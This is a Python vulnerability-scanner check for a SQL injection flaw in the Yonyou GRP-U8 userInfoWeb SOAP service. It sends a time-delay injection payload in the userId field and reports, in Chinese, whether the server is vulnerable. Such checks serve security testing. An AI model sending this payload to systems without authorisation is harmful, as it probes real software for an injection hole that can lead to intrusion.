vulnerability_scanners/yonyou_grp_u8_userInfoWeb_sqli_rce.py

import requests

def check_yonyou_grp_u8_userInfoWeb_sqli_rce(url):
    try:
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8'
        }
        data = """
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
        <soapenv:Header/>
        <soapenv:Body>
        <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:5'--</userId>
        </ser:getUserNameById>
        </soapenv:Body>
        </soapenv:Envelope>
        """
        response = requests.post(f"{url}/services/userInfoWeb", headers=headers, data=data)
        if response.elapsed.total_seconds() > 5:
            return "用友GRP-U8 userInfoWeb SQL注入致RCE漏洞存在"
        else:
            return "用友GRP-U8 userInfoWeb SQL注入致RCE漏洞不存在"
    except Exception as e:
        return f"Error: {e}"